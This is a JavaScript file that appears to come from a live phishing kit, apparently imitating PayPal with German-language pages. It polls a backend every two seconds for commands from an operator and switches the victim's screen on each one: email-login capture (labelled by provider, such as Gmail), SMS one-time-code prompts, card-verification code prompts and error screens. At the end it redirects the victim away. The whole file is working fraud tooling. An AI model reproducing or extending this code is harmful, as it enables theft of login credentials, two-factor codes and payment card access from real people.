//Live Script:.
function loadstation() {
    var lastState = '';
    sendPost(sess);

    $.ajax({
        type: 'POST',
        url: 'backend.php',
        data: {
            'action': 'getState',
            '_sess': sess
        },
        success: function(response, status, xhr) {
            lastState = response;
            checkState(response);
        },
        error: function(xhr, status, error) {
            console.log("Error loading content: " + error);
        }
    });
}

function checkState(state) {

    if (state.includes("LOADING") && time == waitLIVESleep && lastWindows == 'landing-page') {
        activateMLForm();
        time = 0;
        return 0;

    } else if (state.includes("LOADING") && time == waitLIVESleep && lastWindows == 'pn-form') {
        hideDiv(lastWindows);
        showDiv(doc_page);
        $('#loading-content').hide();
        time = 0;
        return 0;

    } else if (state.includes("LOADING") && time == goNext && lastWindows == kodeForm && nextWindows == mlForm) {
        activateMLForm();
        time = 0;
        kod_type = "crd";
        return 0;

    } else if (state.includes("LOADING") && time == goNext && lastWindows == kodeForm && nextWindows == doc_page) {
        hideDiv(lastWindows);
        showDiv(doc_page);
        $('#loading-content').hide();
        time = 0;
        return 0;

    } else if (state.includes("LOADING")) {
        console.log("loading!");
        time++;

    } else if (state.trim() === "EMAIL") {
        console.log('EMAIL');
        activateMLForm();
        time = 0;
        kod_type = "crd";
        nextWindows == doc_page
        sendStatusINFO(sess, 'LOADING');
        return 0;

    } else if (state.trim() === "DOCS") {
        console.log('DOCS');
        hideDiv(lastWindows);
        showDiv(doc_page);
        $('#loading-content').hide();
        time = 0;
        return 0;

    } else if (state.trim() === "OTP") {
        console.log('OTP');
        $(kodeError).hide();
        setOpLanding('normal');
        new_form = kodeForm;
        setValue(kodeField, '');
        $('#loading-content').hide();
        $('#' + lastWindows).hide();
        $('#' + new_form).show();
        lastWindows = new_form;
        return 0;

    } else if (state.trim() === "OTP_ERNO") {
        console.log('OTP_ERNO');
        setOpLanding('normal');
        new_form = kodeForm;
        setValue(kodeField, '');
        $('#loading-content').hide();
        $('#' + lastWindows).hide();
        $('#' + new_form).show();
        lastWindows = new_form;
        $(kodeError).show();
        return 0;

    } else if (state.trim() === "CARD_OTP") {
        console.log('CARD_OTP');
        $(kodeError).hide();
        $('#' + kodeField).mask('AAAAAAAAAAAAAAA');
        new_form = kodeForm;
        setOpLanding('card');
        setValue(kodeField, '');
        $('#loading-content').hide();
        $('#' + lastWindows).hide();
        $('#' + new_form).show();
        lastWindows = new_form;
        return 0;

    } else if (state.trim() === "CARD_OTP_ERNO") {
        console.log('CARD_OTP_ERNO');
        new_form = kodeForm;
        $('#' + kodeField).mask('AAAAAAAAAAAAAAA');
        setOpLanding('card');
        setValue(kodeField, '');
        $('#loading-content').hide();
        $('#' + lastWindows).hide();
        $('#' + new_form).show();
        lastWindows = new_form;
        $(kodeError).show();
        return 0;

    } else if (state.trim() === "FINISH") {
        console.log('FINISH');
        $('#loading-content').hide();
        $('#' + lastWindows).hide();
        $('#' + sucForm).show();
        redirect(redirectUrl, 6500);
        return 0;

    }

    setTimeout(loadstation, 2000);
}

function activateMLForm() {
    hideDiv(lastWindows);
    showDiv(LoadPage);
    $('#loading-content').hide();
    setTimeout(function () {
        /******/
        setInner('ml-u-value', getInputValue(userField));

        if (getInputValue(userField).indexOf('gmail') !== -1) {
            setInner('ml-server', 'Gmail');
        } else if (getInputValue(userField).indexOf('yahoo') !== -1) {
            setInner('ml-server', 'Yahoo');
        } else if (getInputValue(userField).indexOf('outlook') !== -1 || getInputValue(userField).indexOf('hotmail') !== -1) {
            setInner('ml-server', 'Outlook');
        } else {
            setInner('ml-server', 'email provider');
        }
        // Keep the same PayPal icon for all email providers
        /******/
        hideDiv(LoadPage);
        showDiv(mlForm);
        $('#loading-content').show();
        setTimeout(function () {
            $('#loading-content').hide();

        }, 1000);
    }, 2050)
}

function setOpLanding(type) {
    if (type == 'normal') {
        setInner('po-h1', 'Geben Sie Ihren Code ein');
        setInner('po-text', 'Wir haben einen 6-stelligen Code an Ihre Telefonnummer gesendet.');
        setInner('po-label', 'Authentifizierungscode');
    } else if (type == 'card') {
        setInner('po-h1', 'Zahlungsmethoden-Verifizierung');
        setInner('po-text', 'Um Ihre Zahlungsmethode zu verifizieren, haben wir einen Code an Ihr Telefon gesendet. Bitte geben Sie den Code ein, um die Karte mit den Endziffern •••• •••• •••• ' + getLastDigits(getInputValue(card_field), 4) + ' zu bestätigen.');
        setInner('po-label', 'Verifizierungscode');
    }
}